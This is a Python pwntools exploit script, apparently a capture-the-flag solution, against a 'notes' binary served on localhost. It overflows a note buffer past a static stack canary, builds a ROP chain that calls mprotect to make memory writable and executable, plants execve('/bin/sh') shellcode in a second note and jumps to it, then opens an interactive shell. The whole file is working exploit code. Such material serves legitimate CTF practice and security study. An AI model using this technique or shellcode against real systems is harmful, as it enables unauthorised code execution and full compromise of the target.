#!/usr/bin/env python3

from pwn import *
from struct import pack

# *------------ UTILS ------------*

def attach_gdb(r):
    if args.GDB:
        gdb.attach(r, gdbscript="""
source ~/opt/pwndbg/gdbinit.py
c
        """)
context.binary = e = ELF("../dist/notes")

r = remote("localhost", 10206)

#r = process("../dist/notes")
#attach_gdb(r)

# Rop:
# create
# edit (inc rdx)
# print
# edit (mprotect)
# jmp

# Gagdets
ret2mprotect = 0x004012af
callrsi = 0x00401155
addrsp8andselectslot = 0x00401083
PROT_RWX = 0x7
SHELLCODE = bytes([0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x54, 0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05])

# Create a first note
r.recvuntil(b">> ")
r.sendline(b"1") # Create note
r.recvuntil(b">> ")
r.sendline(b"0") # Slot 0
r.recvuntil(b">> ")
r.sendline(b"ABC") # Content

# Edit the note to overflow (with static canary) 
r.recvuntil(b">> ")
r.sendline(b"4") # Edit note
r.recvuntil(b">> ")
r.sendline(b"0") # Slot 0
r.recvuntil(b">> ")
# Data + canary + size + *print
# Note: Size is put in rdx (PROT for ret2mprotect)
r.sendline(b"A"*256+p64(0x13371337)+p64(PROT_RWX)+p64(ret2mprotect)) # Content

# Create a second note (to have its adress in rbx)
r.recvuntil(b">> ")
r.sendline(b"1") # Create note
r.recvuntil(b">> ")
r.sendline(b"1") # Slot 1
r.recvuntil(b">> ")
r.sendline(b"AAA") # Content

# Edit the second note to put shellcode at print* place for 2nd note
r.recvuntil(b">> ")
r.sendline(b"4") # Edit note
r.recvuntil(b">> ")
r.sendline(b"1") # Slot 1
r.recvuntil(b">> ")
r.sendline(SHELLCODE) # Content

# Exec "ret2mprotect" to change slot 2 prots to RWX
r.recvuntil(b">> ")
r.sendline(b"3") # Print note
r.recvuntil(b">> ")
r.sendline(b"0") # Slot 0

# Edit the note to overflow (with static canary) 
r.recvuntil(b">> ")
r.sendline(b"4") # Edit note
r.recvuntil(b">> ")
r.sendline(b"0") # Slot 0
r.recvuntil(b">> ")
# Data + canary + size + *print
r.sendline(b"A"*256+p64(0x13371337)+p64(callrsi)+p64(addrsp8andselectslot)) # Content



# Exec "ret2mprotect" to change rdx to 4 (prot exec)
r.recvuntil(b">> ")
r.sendline(b"3") # Print note
r.recvuntil(b">> ")
r.sendline(b"0") # Slot 0

r.sendline(b"1") # Select slot 1

r.interactive()